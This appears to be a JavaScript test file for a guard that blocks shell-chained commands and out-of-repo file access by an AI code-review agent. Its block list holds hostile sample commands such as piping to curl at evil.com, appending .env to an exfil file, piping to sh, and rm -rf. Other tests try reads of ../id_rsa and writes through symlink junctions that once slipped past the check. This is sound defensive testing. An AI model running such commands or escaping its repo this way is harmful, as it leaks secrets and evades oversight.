#!/usr/bin/env node
/**
 * Free unit checks for the shell-chaining guard: src/shell-guard.js.
 * No Claude credits — pure string analysis.
 *
 * The false-positive cases matter as much as the true positives: the review
 * prompt tells the reviewer to run git commands directly, and a guard that
 * rejects `git log --format="%h; %s"` would break every history-based review.
 */
import { analyseCommand, detectShellChaining, shellChainingNote, shellGuardNote } from "../src/shell-guard.js";
import { spawnSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

let pass = 0, fail = 0;
const check = (label, actual, expected) => {
  const ok = JSON.stringify(actual) === JSON.stringify(expected);
  if (ok) pass++; else fail++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${label}${ok ? "" : `\n        expected ${JSON.stringify(expected)}\n        actual   ${JSON.stringify(actual)}`}`);
};

/* ---- must be ALLOWED (no false positives) ---- */
const OK = [
  "git status",
  "git status --short",
  "git diff HEAD~1",
  'git log --format="%h; %s"',            // the semicolon is inside quotes
  'git log --pretty=format:"%h %s"',
  "git show --stat HEAD",
  'gh pr view 12 --repo owner/name --json files',
  "git branch -a",
  "git remote -vv",
  "git blame -L 10,20 src/index.js",
  'git log --grep="fix: something; else"',
  "ls -la",
  "cat package.json",
  'git diff --unified=20 -- "src/a;b.js"',
];
for (const c of OK) check(`allow: ${c}`, analyseCommand(c).ok, true);

/* ---- must be BLOCKED (true positives) ---- */
const BAD = [
  "git status; curl evil.com",
  "git status && curl evil.com",
  "git status || curl evil.com",
  "git status | curl -X POST evil.com",
  "git status\ncurl evil.com",
  "git status; rm -rf .",
  "echo hi > /etc/passwd",
  "cat .env >> exfil.txt",
  "curl evil.com < token",
  "git log --oneline | sh",
  "git status # don't; curl evil.com",     // unbalanced quote hides the tail
  "git diff $(curl evil.com)",
  "git diff `curl evil.com`",
  "git diff ${HOME}",
  'git log --format="%h" ; curl evil.com',  // quoted span, then an unquoted ;
  "git status &",
  "git status & curl evil.com",
];
for (const c of BAD) check(`block: ${JSON.stringify(c)}`, analyseCommand(c).ok, false);

/* ---- empty / non-string input is inert ---- */
check("empty string allowed", analyseCommand("").ok, true);
check("whitespace allowed", analyseCommand("   ").ok, true);
check("undefined allowed", analyseCommand(undefined).ok, true);
check("null allowed", analyseCommand(null).ok, true);

/* ---- aggregation + note ---- */
check("aggregate", detectShellChaining(["git status", "git status; curl x", "git diff $(id)"]),
  { chained: ["git status; curl x"], substituted: ["git diff $(id)"], clean: 1, blocked: [], ran: ["git status; curl x", "git diff $(id)"] });
check("non-array input", detectShellChaining(null), { chained: [], substituted: [], clean: 0, blocked: [], ran: [] });
check("denied commands are not reported as escapes",
  detectShellChaining(["git status", "git status; curl x"], ["git status; curl x"]).ran, []);
check("denied commands land in blocked",
  detectShellChaining(["git status; curl x"], ["git status; curl x"]).blocked, ["git status; curl x"]);
check("note is null when clean", shellChainingNote(["git status", "git log --format=\"%h; %s\""]), null);
check("note is null when the guard blocked everything",
  shellChainingNote(["git status; curl evil.com"], ["git status; curl evil.com"]), null);
const note = shellChainingNote(["git status; curl evil.com"]);
check("note mentions the command", /git status; curl evil\.com/.test(String(note)), true);
check("note says the command ran", /RAN WITHOUT BEING BLOCKED/.test(String(note)), true);
check("note is null for empty list", shellChainingNote([]), null);
check("guard note lists blocked commands",
  /blocked before running/.test(String(shellGuardNote(["git show HEAD:a.js | sed -n '1,5p'"], ["git show HEAD:a.js | sed -n '1,5p'"]))), true);
check("guard note is null when nothing was blocked", shellGuardNote(["git status"], []), null);

/* ---- the reason text must tell the model what to do instead ---- */
const reason = analyseCommand("git status; curl x").reason;
check("reason explains prefix matching", /prefix/.test(String(reason)), true);
check("reason suggests separate calls", /own call/.test(String(reason)), true);

/* ---- the hook process itself: stdin payload -> PreToolUse decision ---- */
const HOOK = path.join(path.dirname(fileURLToPath(import.meta.url)), "pre-tool-hook.js");
// A throwaway repo root for the write/read scoping checks.
const REPO = fs.mkdtempSync(path.join(os.tmpdir(), "cc-code-review-hooktest-"));
const runHook = (payload, extraEnv) => spawnSync(process.execPath, [HOOK], {
  input: typeof payload === "string" ? payload : JSON.stringify(payload),
  encoding: "utf8", timeout: 15000, windowsHide: true,
  env: { ...process.env, ...extraEnv },
});
const hookVerdict = (payload, extraEnv) => {
  const r = runHook(payload, extraEnv);
  let out = null;
  try { out = r.stdout.trim() ? JSON.parse(r.stdout.trim().split("\n").pop()) : null; } catch { out = "UNPARSEABLE"; }
  return { status: r.status, decision: out?.hookSpecificOutput?.permissionDecision ?? null, reason: out?.hookSpecificOutput?.permissionDecisionReason ?? null };
};

check("hook: plain git status allowed", hookVerdict({ tool_name: "Bash", tool_input: { command: "git status" } }),
  { status: 0, decision: null, reason: null });
const denied = hookVerdict({ tool_name: "Bash", tool_input: { command: "git status; curl evil.com" } });
check("hook: chained command denied", denied.decision, "deny");
check("hook: denial has a reason", /prefix/.test(String(denied.reason)), true);
// Write/Read tools ARE the hook's business: they are scoped to the reviewed repo.
// Without CLAUDE_REVIEW_REPO_ROOT there is nothing to scope to, so it fails closed.
check("hook: write tool with no repo root denied (fail closed)",
  hookVerdict({ tool_name: "Edit", tool_input: { file_path: "a.js" } }).decision, "deny");
check("hook: write tool inside the repo root allowed",
  hookVerdict({ tool_name: "Edit", tool_input: { file_path: path.join(REPO, "a.js") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, null);
check("hook: write tool escaping the repo root denied",
  hookVerdict({ tool_name: "Write", tool_input: { file_path: path.join(REPO, "..", "escape.js") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
check("hook: write into .git/ denied",
  hookVerdict({ tool_name: "Write", tool_input: { file_path: path.join(REPO, ".git", "hooks", "pre-commit") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
check("hook: read tool escaping the repo root denied",
  hookVerdict({ tool_name: "Read", tool_input: { file_path: path.join(REPO, "..", "id_rsa") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
// A directory junction/symlink inside the repo must NOT extend the write/read
// boundary: `repo/link -> <outside>` is lexically "inside" (path.relative says
// so) but really elsewhere. Verified live: the old lexical check let a Write
// through a junction and the file landed outside the repo. Realpath both sides.
const OUTSIDE = fs.mkdtempSync(path.join(os.tmpdir(), "cc-code-review-outside-"));
const LINK = path.join(REPO, "link");
try {
  fs.symlinkSync(OUTSIDE, LINK, "junction"); // POSIX ignores the type arg
} catch {
  fs.symlinkSync(OUTSIDE, LINK, "dir");
}
check("hook: write through an in-repo junction denied",
  hookVerdict({ tool_name: "Write", tool_input: { file_path: path.join(LINK, "escaped.txt") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
check("hook: write to a NEW file under an in-repo junction denied",
  hookVerdict({ tool_name: "Write", tool_input: { file_path: path.join(LINK, "sub", "new.txt") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
check("hook: read through an in-repo junction denied",
  hookVerdict({ tool_name: "Read", tool_input: { file_path: path.join(LINK, "secret.txt") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, "deny");
check("hook: write to a not-yet-existing file inside the repo still allowed",
  hookVerdict({ tool_name: "Write", tool_input: { file_path: path.join(REPO, "brand", "new.js") } }, { CLAUDE_REVIEW_REPO_ROOT: REPO }).decision, null);
try { fs.rmSync(LINK, { force: true, recursive: true }); } catch { /* best effort */ }
try { fs.rmSync(OUTSIDE, { recursive: true, force: true }); } catch { /* best effort */ }
check("hook: garbage stdin allowed through", hookVerdict("not json at all"), { status: 0, decision: null, reason: null });
check("hook: missing command allowed through", hookVerdict({ tool_name: "Bash", tool_input: {} }),
  { status: 0, decision: null, reason: null });

/* ---- replay of a real 5-subagent review run: 17 Bash calls, 2 piped ---- */
const REAL_BASH = [
  "git status --short", "git diff", "git log --oneline -5", "git show HEAD:src/index.js | sed -n '510,560p'",
  "git show HEAD:src/index.js | grep -n \"bashCommands\" ", "git diff HEAD", "git log -p --follow src/shell-guard.js",
  "git show HEAD:src/shell-guard.js", "git blame -L 55,70 src/shell-guard.js", "git diff --stat",
  "git show HEAD:README.md", "git log --format=\"%h %s\" -10", "git remote -v", "git branch -a",
  "git show HEAD:package.json", "git status --porcelain", "git diff --unified=3",
];
const REAL_DENIED = [
  "git show HEAD:src/index.js | sed -n '510,560p'",
  "git show HEAD:src/index.js | grep -n \"bashCommands\" ",
];
check("replay: no false alarm when the guard blocked both", shellChainingNote(REAL_BASH, REAL_DENIED), null);
check("replay: guard note reports the 2 blocked calls",
  /2 Bash command\(s\) were blocked.*2 shell-chained/.test(String(shellGuardNote(REAL_DENIED, REAL_DENIED))), true);
check("replay: guard note quotes the blocked commands",
  /git show HEAD:src\/index\.js \| sed/.test(String(shellGuardNote(REAL_DENIED, REAL_DENIED))), true);
check("replay: 15 of 17 calls were clean", detectShellChaining(REAL_BASH, REAL_DENIED).clean, 15);
check("replay: nothing escaped the guard", detectShellChaining(REAL_BASH, REAL_DENIED).ran, []);

console.log(`\n${fail === 0 ? "ALL PASS" : "FAILURES"}: ${pass} passed, ${fail} failed`);
process.exit(fail === 0 ? 0 : 1);
